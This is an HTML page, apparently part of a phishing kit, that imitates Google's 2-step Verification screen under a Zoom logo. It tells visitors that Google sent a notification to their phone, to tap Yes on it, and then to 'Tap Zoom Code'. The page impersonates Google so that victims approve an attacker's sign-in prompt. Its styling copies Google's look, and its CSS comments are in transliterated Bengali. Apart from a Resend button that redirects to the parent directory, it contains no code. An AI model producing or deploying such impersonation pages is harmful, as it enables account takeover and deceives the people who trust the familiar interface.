<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>2-step Verification</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    /* Professional layout container */
    .container {
      width: 100%;
      height: 100dvh;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      text-align: center;
      padding: 2vh 5vw 2.5vh 5vw;
      background: #ffffff;
      max-width: 440px;
      margin: 0 auto;
    }

    /* Top Section */
    .top-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.5vh;
    }

    /* Zoom Logo - Boro kora holo */
    .logo {
      width: 15vw;
      max-width: 60px;
      height: auto;
      object-fit: contain;
      border-radius: 50%;
    }

    /* Main Heading - Boro font */
    h1 {
      font-size: clamp(22px, 5.8vw, 27px);
      font-weight: 500;
      color: #202124;
    }

    /* Subtitle - Boro font */
    .subtitle {
      font-size: clamp(14px, 3.8vw, 16px);
      color: #5f6368;
      font-weight: 400;
      max-width: 350px;
      line-height: 1.35;
    }

    /* Email Pill Selector box */
    .email-pill {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      padding: 5px 14px;
      border: 1px solid #dadce0;
      border-radius: 20px;
      margin-top: 0.4vh;
      background: #fff;
    }

    .email-pill svg {
      width: 18px;
      height: 18px;
      fill: #1a73e8;
    }

    .email-text {
      font-size: 14px;
      font-weight: 500;
      color: #3c4043;
    }

    .email-pill .arrow {
      font-size: 10px;
      color: #5f6368;
    }

    /* Phone Graphic Illustration - Aro boro ebong gap fill korar jonno */
    .phone-illustration {
      width: 65vw;
      max-width: 270px;
      height: auto;
      max-height: 42vh;
      object-fit: contain;
      margin: auto 0;
    }

    /* Bottom Section */
    .bottom-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 1.5vh;
    }

    /* Text Group */
    .text-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 0.4vh;
    }

    /* Sub Heading - Boro font */
    h2 {
      font-size: clamp(19px, 5vw, 23px);
      font-weight: 500;
      color: #202124;
    }

    /* Description Text - Boro font */
    .desc-text {
      font-size: clamp(15px, 4.2vw, 18px);
      font-weight: 400;
      color: #3c4043;
      line-height: 1.4;
    }

    .desc-text span {
      font-weight: 600;
      color: #202124;
    }

    /* Resend / Action Button - Ektu opore ana holo */
    .btn-join {
      background-color: #1a73e8;
      color: white;
      padding: 14px 0;
      width: 100%;
      max-width: 360px;
      font-size: 16.5px;
      font-weight: 500;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-join:hover {
      background-color: #1557b0;
    }

    .btn-join:active {
      background-color: #174ea6;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="top-section">
      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
      <h1>2-step Verification</h1>
      <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
      
      <div class="email-pill">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
        <span class="email-text">user@gmail.com</span>
        <span class="arrow">▼</span>
      </div>
    </div>

    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">

    <div class="bottom-section">
      <div class="text-group">
        <h2>Check your phone.</h2>
        <p class="desc-text">
          Google sent a notification to your phone.<br>
          <span>Tap Yes</span> on the notification<br>
          Then Tap Zoom Code
        </p>
      </div>
      <button class="btn-join" onclick="window.location.href='../'">Resend</button>
    </div>
  </div>

</body>
</html>
